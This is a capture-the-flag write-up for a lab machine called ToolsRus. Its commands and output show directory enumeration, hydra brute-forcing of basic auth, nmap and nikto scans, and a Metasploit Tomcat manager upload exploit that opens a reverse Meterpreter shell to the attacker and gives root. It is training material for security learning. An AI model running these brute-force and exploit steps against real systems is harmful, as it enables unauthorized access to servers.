<h1 align="center">Challenge 047 - ToolsRus </h1>
<div align="center">
  <img src="https://github.com/user-attachments/assets/0a0eca69-63e6-4685-aa78-d1c8fba65ae4" width="90" height="90" />
</div>
<br>
<p align="center"> <b>Difficulty</b>: 2/10 (Easy) <b>Completed</b>: ✔️ 03.11.2025 </p>

In this challenge we will have the opportunity to use several tools from Dirbuster to Metasploit to enumerate a server, gather information and eventually take over the machine.

Right at the very beginning we are asked what directory we can find, that begins with a "g". I made use of gobuster. I don't think that will have any severe consequences if I use this tool instead of dirbuster and as we can see the answer was sucessfully gathered.
Apache Tomcat Manager Authenticated Upload Code Execution

```
root@ip-10-10-250-12:~# gobuster dir -u 10.10.167.127 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.167.127
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 292]
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/guidelines           (Status: 301) [Size: 319] [--> http://10.10.167.127/guidelines/]
/index.html           (Status: 200) [Size: 168]
/protected            (Status: 401) [Size: 460]
/server-status        (Status: 403) [Size: 301]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Before entering that directory I just wanted to check out the target IP-Address to see what the main page even looks like.

<img width="1156" height="289" alt="grafik" src="https://github.com/user-attachments/assets/856e3d74-466d-4095-92ef-4b09a4f88bfc" />

Not much else can be gathered, not even from the Page Source, so we quickly move on to checking out the hidden directory.

<img width="1156" height="160" alt="Bildschirmfoto vom 2025-11-03 14-18-56" src="https://github.com/user-attachments/assets/176708cc-eda7-4df4-8c4e-57ddc9fb1ca9" />

This hidden directory tells us two vital information. The first one is the name that probably belongs to the admin or some other developer of the website. The second is that the website is running a TomCat Server, that probably needs to be patched as it probably is highly susceptible for exploits. 

The next question is asking what directory would have basic authentification. There was another directory that we didn't check out yet, and indeed after requesting it, we see a login page.

<img width="493" height="287" alt="grafik" src="https://github.com/user-attachments/assets/f64400b1-2b46-4fc6-a9e3-fa2f01b04e34" />

As the next question asks us to find out the password of bob, my assumption would be to use hydra to bruteforce that information out with the rockyou file.

```
root@ip-10-10-250-12:~# hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.167.127 http-get /protected
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-03 13:40:43
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-get://10.10.167.127:80/protected
[80][http-get] host: 10.10.167.127   login: bob   password: xxxxxxx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-03 13:40:54
```

And it's done. Beautiful. When we use these credentials the web page we see unfortunately leads to a dead end, with the hint to look for another port.

<img width="498" height="235" alt="grafik" src="https://github.com/user-attachments/assets/c0fc5c8f-e92b-44ec-8e87-d9baa8a08ffc" />

That's probably why the challenge wants us to use nmap now, as we are being asked what other ports serve an open web service on the machine.

```
root@ip-10-10-250-12:~# nmap -sV -p- -A 10.10.167.127
Starting Nmap 7.80 ( https://nmap.org ) at 2025-11-03 13:46 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.167.127
Host is up (0.00028s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:8d:cb:a9:5e:94:9b:f6:95:98:2f:e7:c1:ca:03:76 (RSA)
|   256 c8:3a:95:3e:88:60:79:44:2d:f8:c7:a6:91:07:4f:67 (ECDSA)
|_  256 78:d1:03:d9:89:d2:19:56:06:ae:39:54:9b:1c:0b:8f (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
MAC Address: 02:5F:D4:80:A7:4B (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.28 ms 10.10.167.127

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.85 seconds
```

The only other web page in this context is port 1234. The name and version we were able to find out through the -A parameter, which enables OS detection, version detection, script scanning and traceroute. In this context the name and version of the software running is Apache Tomcat/7.0.88.

Next we have to use Nikto with the credentials we have found and scan the /manager/html directory of said port. It's important to clarify our credentials with the id parameter. In this instance we ALSO had to use -o parameter to save our output in a text file or else we wouldn't get the full answer.

```
root@ip-10-10-252-176:~# sudo nikto -h http://10.10.167.127:1234/manager/html -id bob:bubbles -o nikto_full.txt
sudo: unable to resolve host ip-10-10-252-176: Name or service not known
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.167.127
+ Target Hostname:    10.10.167.127
+ Target Port:        1234
+ Start Time:         2025-11-03 14:46:34 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
+ Cookie JSESSIONID created without the httponly flag
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-3092: /manager/html/localstart.asp: This may be interesting...
+ OSVDB-3233: /manager/html/manager/manager-howto.html: Tomcat documentation found.
+ /manager/html/manager/html: Default Tomcat Manager interface found
+ /manager/html/WorkArea/version.xml: Ektron CMS version information
+ 6544 items checked: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2025-11-03 14:46:44 (GMT0) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Now we check the file.

<img width="974" height="398" alt="grafik" src="https://github.com/user-attachments/assets/c47e7f6e-c9cf-4fb1-ad9c-21d211c10702" />

As the answer is 5 the documents probably are
- /manager/html/manager/html/localstart.asp
- /manager/html/manager/html/manager/manager-howto.html
- /manager/html/manager/html/manager/html
- /manager/html/WorkArea/version.xml
- /manager/html/

This was unnecessarily complicated, but we can move on now. The next question needs us to find out the server version. For that we can just look at the nmap output again, or we could use Nikto again. I decided to do the former, as Nikto already frustrated me enough for today.

The version is Apache/2.4.18. For Apache-Coyote the version that's running is 1.1.

Now we have to use Metasploit to exploit the service and get a shell on the system. We search for Tomcat

```
msf6 > search tomcat

Matching Modules
================

   #   Name                                                                       Disclosure Date  Rank       Check  Description
   -   ----                                                                       ---------------  ----       -----  -----------
   0   auxiliary/dos/http/apache_commons_fileupload_dos                           2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   1   exploit/multi/http/struts_dev_mode                                         2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   2   exploit/multi/http/struts2_namespace_ognl                                  2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   3     \_ target: Automatic detection                                           .                .          .      .
   4     \_ target: Windows                                                       .                .          .      .
   5     \_ target: Linux                                                         .                .          .      .
   6   exploit/multi/http/struts_code_exec_classloader                            2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   7     \_ target: Java                                                          .                .          .      .
   8     \_ target: Linux                                                         .                .          .      .
   9     \_ target: Windows                                                       .                .          .      .
   10    \_ target: Windows / Tomcat 6 & 7 and GlassFish 4 (Remote SMB Resource)  .                .          .      .
   11  auxiliary/admin/http/tomcat_ghostcat                                       2020-02-20       normal     Yes    Apache Tomcat AJP File Read
   12  exploit/windows/http/tomcat_cgi_cmdlineargs                                2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   13  exploit/multi/http/tomcat_mgr_deploy                                       2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   14    \_ target: Automatic                                                     .                .          .      .
   15    \_ target: Java Universal                                                .                .          .      .
   16    \_ target: Windows Universal                                             .                .          .      .
   17    \_ target: Linux x86                                                     .                .          .      .
   18  exploit/multi/http/tomcat_mgr_upload                                       2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   19    \_ target: Java Universal                                                .                .          .      .
   20    \_ target: Windows Universal                                             .                .          .      .
   21    \_ target: Linux x86                                                     .                .          .      .
   22  auxiliary/dos/http/apache_tomcat_transfer_encoding                         2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
   23  auxiliary/scanner/http/tomcat_enum                                         .                normal     No     Apache Tomcat User Enumeration
   24  exploit/linux/local/tomcat_rhel_based_temp_priv_esc                        2016-10-10       manual     Yes    Apache Tomcat on RedHat Based Systems Insecure Temp Config Privilege Escalation
   25  exploit/linux/local/tomcat_ubuntu_log_init_priv_esc                        2016-09-30       manual     Yes    Apache Tomcat on Ubuntu Log Init Privilege Escalation
   26  exploit/multi/http/atlassian_confluence_webwork_ognl_injection             2021-08-25       excellent  Yes    Atlassian Confluence WebWork OGNL Injection
   27    \_ target: Unix Command                                                  .                .          .      .
   28    \_ target: Linux Dropper                                                 .                .          .      .
   29    \_ target: Windows Command                                               .                .          .      .
   30    \_ target: Windows Dropper                                               .                .          .      .
   31    \_ target: PowerShell Stager                                             .                .          .      .
   32  exploit/windows/http/cayin_xpost_sql_rce                                   2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
   33  exploit/multi/http/cisco_dcnm_upload_2019                                  2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   34    \_ target: Automatic                                                     .                .          .      .
   35    \_ target: Cisco DCNM 11.1(1)                                            .                .          .      .
   36    \_ target: Cisco DCNM 11.0(1)                                            .                .          .      .
   37    \_ target: Cisco DCNM 10.4(2)                                            .                .          .      .
   38  exploit/linux/http/cisco_hyperflex_hx_data_platform_cmd_exec               2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform Command Execution
   39    \_ target: Unix Command                                                  .                .          .      .
   40    \_ target: Linux Dropper                                                 .                .          .      .
   41  exploit/linux/http/cisco_hyperflex_file_upload_rce                         2021-05-05       excellent  Yes    Cisco HyperFlex HX Data Platform unauthenticated file upload to RCE (CVE-2021-1499)
   42    \_ target: Java Dropper                                                  .                .          .      .
   43    \_ target: Linux Dropper                                                 .                .          .      .
   44  exploit/linux/http/cpi_tararchive_upload                                   2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
   45  exploit/linux/http/cisco_prime_inf_rce                                     2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
   46  post/multi/gather/tomcat_gather                                            .                normal     No     Gather Tomcat Credentials
   47  auxiliary/dos/http/hashcollision_dos                                       2011-12-28       normal     No     Hashtable Collisions
   48  auxiliary/admin/http/ibm_drm_download                                      2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
   49  exploit/linux/http/lucee_admin_imgprocess_file_write                       2021-01-15       excellent  Yes    Lucee Administrator imgProcess.cfm Arbitrary File Write
   50    \_ target: Unix Command                                                  .                .          .      .
   51    \_ target: Linux Dropper                                                 .                .          .      .
   52  exploit/linux/http/mobileiron_core_log4shell                               2021-12-12       excellent  Yes    MobileIron Core Unauthenticated JNDI Injection RCE (via Log4Shell)
   53    \_ AKA: Log4Shell                                                        .                .          .      .
   54    \_ AKA: LogJam                                                           .                .          .      .
   55  exploit/multi/http/zenworks_configuration_management_upload                2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
   56  exploit/multi/http/primefaces_weak_encryption_rce                          2016-02-15       excellent  Yes    Primefaces Remote Code Execution Exploit
   57  exploit/multi/http/spring_framework_rce_spring4shell                       2022-03-31       manual     Yes    Spring Framework Class property RCE (Spring4Shell)
   58    \_ target: Java                                                          .                .          .      .
   59    \_ target: Linux                                                         .                .          .      .
   60    \_ target: Windows                                                       .                .          .      .
   61    \_ AKA: Spring4Shell                                                     .                .          .      .
   62    \_ AKA: SpringShell                                                      .                .          .      .
   63  auxiliary/admin/http/tomcat_administration                                 .                normal     No     Tomcat Administration Tool Default Access
   64  auxiliary/scanner/http/tomcat_mgr_login                                    .                normal     No     Tomcat Application Manager Login Utility
   65  exploit/multi/http/tomcat_jsp_upload_bypass                                2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   66    \_ target: Automatic                                                     .                .          .      .
   67    \_ target: Java Windows                                                  .                .          .      .
   68    \_ target: Java Linux                                                    .                .          .      .
   69  auxiliary/admin/http/tomcat_utf8_traversal                                 2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
   70  auxiliary/admin/http/trendmicro_dlp_traversal                              2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
   71  post/windows/gather/enum_tomcat                                            .                normal     No     Windows Gather Apache Tomcat Enumeration


Interact with a module by name or index. For example info 71, use 71 or use post/windows/gather/enum_tomcat
```

I looked for exploits with an excellent ranking and keywords like *Manager*. One description felt especially interesting *Apache Tomcat Manager Authenticated Upload Code Execution*. I used this exploit and configured username, password, host and port.

```
msf6 > use exploit/multi/http/tomcat_mgr_upload
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/usi
                                            ng-metasploit/basics/using-metasploit.html
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy
                                            will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.252.176    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
HttpPassword => bubbles
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
HttpUsername => bob
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.167.127
RHOSTS => 10.10.167.127
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
RPORT => 1234
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
[*] Started reverse TCP handler on 10.10.252.176:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying 3isbJ9Zle98Z8zH...
[*] Executing 3isbJ9Zle98Z8zH...
[*] Undeploying 3isbJ9Zle98Z8zH ...
[*] Undeployed at /manager/html/undeploy
[*] Sending stage (58073 bytes) to 10.10.167.127
[*] Meterpreter session 1 opened (10.10.252.176:4444 -> 10.10.167.127:58388) at 2025-11-03 15:18:42 +0000
```

With the *shell* command we are able to drop a command shell on the target system. It allows us to execute system commands directly on the compromised machine, enabling us to interact with the system as if we were physically present.

```
whoami
root
```

We already have root privileges? Sweet. That makes the finding of the root flag even easier.

```
ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
cd root
ls
flag.txt
snap
```

Now we only just need to cat the file.

<img width="296" height="59" alt="Bildschirmfoto vom 2025-11-03 16-28-19" src="https://github.com/user-attachments/assets/7ab95def-e1e0-43c1-9d2b-b2fb01cc65d9" />

## Lesson Learned
This CTf was a great way to get acquainted with several tools and do some easy enumerations. Nikto and Metasploit were especially interesting for me, as I never really made use of them before. Nikto is an open-source web server scanner designed to identify vulnerabilities and security issues. It performs comprehensive tests against web servers for outdated software versions, server misconfigurations, and potentially dangerous files and scripts.

Metasploit on the other hand is more of a penetration testing framework that allows security professionals to find and exploit vulnerabilities in systems. It provides a variety of tools and modules to develop, test and execute exploits against target systems, allowing users to gain unauthorized access. It supports various payloads and can automate the exploitation process, making it a crucial tool in the security assessment toolkit.
